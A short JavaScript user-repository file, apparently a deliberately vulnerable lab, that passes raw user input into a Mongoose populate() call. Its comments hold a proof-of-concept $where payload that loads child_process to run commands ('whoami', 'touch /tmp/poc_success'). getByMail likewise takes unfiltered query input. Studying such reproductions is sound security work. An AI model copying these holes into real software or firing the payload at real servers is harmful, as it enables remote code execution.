import User from "../models/user.models.js"

class UserRepository {
    static async register(new_user_object) {
        const new_user = new User(new_user_object)
        return await new_user.save()
    }

    static async getByMail(email) {
        return User.findOne(email)
    }

    static async getByName(name) {
        return await User.findOne({ name: name })
    }

    static async getUserProductsByName(name, unsanitizedInput) {
        try {

            return User.findOne({ name: name }).populate(unsanitizedInput)
            // products[path]=products&products[match][][$or][][$where]=typeof%20global%20!=%20'undefined'%20%3F%20whoami%20%3A%201
            // products[path]=prodts&products[match][][$or][][$where]=typeof%20global%20!=%20'undefined'%20%3F%20whoami%20%3A%201
            // return User.findOne({ name: name }).populate({
            //     path: 'products',
            //     match: [
            //         {
            //             $or: [
            //                 {
            //                     $where: "typeof global != 'undefined' ? global.process.mainModule.constructor._load('child_process').exec('touch /tmp/poc_success') : 1"
            //                 }
            //             ]
            //         }
            //     ],
            //     strictPopulate: false
            // })
        } catch (error) {
            console.log(error)
            return null
        }
    }
}

export default UserRepository